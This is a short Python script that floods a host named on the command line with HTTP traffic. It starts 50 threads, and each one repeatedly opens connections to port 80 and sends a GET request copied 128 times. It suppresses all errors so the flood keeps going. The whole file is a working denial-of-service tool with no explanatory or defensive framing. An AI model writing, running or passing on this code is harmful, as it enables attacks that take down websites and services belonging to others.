import threading, socket, sys

def get():
    while True:
         try:
             host = str(sys.argv[1])
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((host, 80))
             s.send(f'GET / HTTP/1.1\r\nHost:{host}\r\n\r\n'.encode() * 128)
         except KeyboardInterrupt:
             sys.exit(-1)
         except:
             pass
for i in range(0, 50):
    threading.Thread(target=get).start()
